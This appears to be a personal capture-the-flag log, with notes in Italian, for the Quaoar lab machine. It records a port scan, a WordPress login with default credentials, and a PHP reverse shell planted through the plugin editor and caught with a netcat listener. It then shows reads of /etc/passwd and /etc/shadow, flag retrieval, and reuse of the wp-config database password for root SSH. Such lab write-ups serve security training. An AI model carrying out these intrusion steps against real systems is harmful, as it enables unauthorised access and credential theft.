@@ -1,0 +1,180 @@
+nmap -sT 192.168.236.145 -p-
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-10 11:26 CET
+Nmap scan report for 192.168.236.145
+Host is up (0.0079s latency).
+Not shown: 65526 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+53/tcp  open  domain      ISC BIND 9.8.1-P1
+80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+993/tcp open  ssl/imaps?
+995/tcp open  ssl/pop3s?
+
+
+
+
+http://192.168.236.145/wordpress/wp-admin/
+    urs: admin
+    pwd: admin
+
+
+entro nell'editor del plugine odifico il testo di un file php con la reverse shell presa da /usr/share/webshells/php# cat php-reverse-shell.php
+
+    hare/webshells/php#
+root@ermy:/usr/share/webshells/php# cp php-reverse-shell.php /Scrivania/CTF
+cp: impossibile creare il file regolare '/Scrivania/CTF': File o directory non esistente
+root@ermy:/usr/share/webshells/php# cp php-reverse-shell.php /root/Sc
+Scaricati/ Scrivania/
+root@ermy:/usr/share/webshells/php# cp php-reverse-shell.php /root/Sc
+Scaricati/ Scrivania/
+root@ermy:/usr/share/webshells/php# cp php-reverse-shell.php /root/Scrivania/CTF/quaoar/
+root@ermy:/usr/share/webshells/php# nc -nlvvp 4444
+listening on [any] 4444 ...
+connect to [192.168.236.1] from (UNKNOWN) [192.168.236.145] 49539
+Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux
+ 05:46:15 up  1:27,  0 users,  load average: 2.13, 2.15, 1.95
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:107::/var/run/dbus:/bin/false
+colord:x:104:109:colord colour management daemon,,,:/var/lib/colord:/bin/false
+whoopsie:x:105:112::/nonexistent:/bin/false
+avahi:x:106:115:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+bind:x:107:117::/var/cache/bind:/bin/false
+postfix:x:108:118::/var/spool/postfix:/bin/false
+dovecot:x:109:120:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:110:65534:Dovecot login user,,,:/nonexistent:/bin/false
+landscape:x:111:121::/var/lib/landscape:/bin/false
+libvirt-qemu:x:112:106:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
+libvirt-dnsmasq:x:113:123:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
+sshd:x:114:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:115:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+tomcat6:x:116:126::/usr/share/tomcat6:/bin/false
+wpadmin:x:1001:1001::/home/wpadmin:/bin/sh
+$
+$
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ cd home
+$ cd /home
+$ ls
+wpadmin
+$ cd /wpadmin
+/bin/sh: 11: cd: can't cd to /wpadmin
+$ ls -alhR
+.:
+total 12K
+drwxr-xr-x  3 root root 4.0K Oct 24  2016 .
+drwxr-xr-x 22 root root 4.0K Oct  7  2016 ..
+drwxr-xr-x  2 root root 4.0K Oct 22  2016 wpadmin
+
+./wpadmin:
+total 12K
+drwxr-xr-x 2 root    root    4.0K Oct 22  2016 .
+drwxr-xr-x 3 root    root    4.0K Oct 24  2016 ..
+-rw-r--r-- 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
+$ cat flag.txt
+cat: flag.txt: No such file or directory
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ cd
+$ pwd
+/home
+$ ls -al
+total 12
+drwxr-xr-x  3 root root 4096 Oct 24  2016 .
+drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
+drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
+$ cd wpadmin
+$ ls
+flag.txt
+$ cat flag.txt
+2bafe61f03117ac66a73c3c514de796e
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+cd var/www
+apro il file wp-config e guardo la password del db
+trovata la pwd, provo in ssh per connettermi con root e password.
+FATTO
+
+
+
+
+
+
+pentest monkey --> unix-privesc-check
